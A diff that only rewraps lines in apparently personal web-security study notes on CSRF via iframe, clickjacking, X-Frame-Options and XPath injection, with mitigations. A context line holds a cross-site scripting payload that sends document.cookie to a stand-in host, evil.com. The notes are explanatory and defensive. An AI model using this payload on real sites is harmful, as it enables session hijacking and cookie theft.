@@ -407,9 +407,8 @@ Both RAM and SITA have a common symmetric number now.
     flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
     ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>
 
-		4. When the evil.com page is visited by the victim, the browser makes a request to example.com silently using iframe.
-		The request contains the xss vulnerable parameter and the payload is injected along.
-
+		4. When the evil.com page is visited by the victim, the browser makes a request to example.com silently
+		    using iframe. The request contains the xss vulnerable parameter and the payload is injected along.
 		5. The payload says to make a request to evil.com along with the cookie of the example.com website.
 
 >CSRF using iframe injection
@@ -418,20 +417,29 @@ Here the user doesn't knows that example.com was visited.
 
 19. X-Frame-Options headers tells the browser not to allow loading of the webpage in an iframe, frame or object.
 
-20. Clickjacking is an attack that occurs when an attacker uses a transparent iframe in a window to trick a user into clicking on a  button or link, to another server in which they have an identical looking window.
+20. Clickjacking is an attack that occurs when an attacker uses a transparent iframe in a window to trick a user into
+  clicking on a button or link, to another server in which they have an identical looking window.
 
-	Example: For example, imagine an attacker who builds a web site that has a button on it that says "click here for a free iPod". 		However, on top of that web page, the attacker has loaded an iframe with your mail account, and lined up exactly the "delete 			all messages" button directly on top of the "free iPod" button. The victim tries to click on the "free iPod" button but 		instead actually clicked on the "delete all messages" button. In essence, the attacker has "hijacked" the user's 			click, hence the name "Clickjacking".
+	Example: For example, imagine an attacker who builds a web site that has a button on it that says "click here for
+	a free iPod". However, on top of that web page, the attacker has loaded an iframe with your mail account, and
+	lined up exactly the "delete all messages" button directly on top of the "free iPod" button. The victim tries
+	to click on the "free iPod" button but instead actually clicked on the "delete all messages" button. In essence,
+	the attacker has "hijacked" the user's click, hence the name "Clickjacking".
 
 21. XPATH injection
 
-		1. Xpath is a language used to query certain parts of a XML document. It can be compared to the SQL language used to query 				databases.
+		1. Xpath is a language used to query certain parts of a XML document. It can be compared to the SQL language
+		used to query databases.
 
-		2. XPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query for XML data.
+		2. XPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query
+		for XML data.
 
-		3. By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured, 				or access data that he may not normally have access to.
+		3. By sending intentionally malformed information into the web site, an attacker can find out how the
+		XML data is structured, or access data that he may not normally have access to.
 
 		Mitigation:
-			 >Use a parameterized XPath interface if one is available, or escape the user input to make it safe to include in a 				 dynamically constructed query.
+			 >Use a parameterized XPath interface if one is available, or escape the user input to make
+			 it safe to include in a dynamically constructed query.
 
 			 >input containing any XPath metacharacters such as " ' / @ = * [ ] ( and ) should be rejected.
 
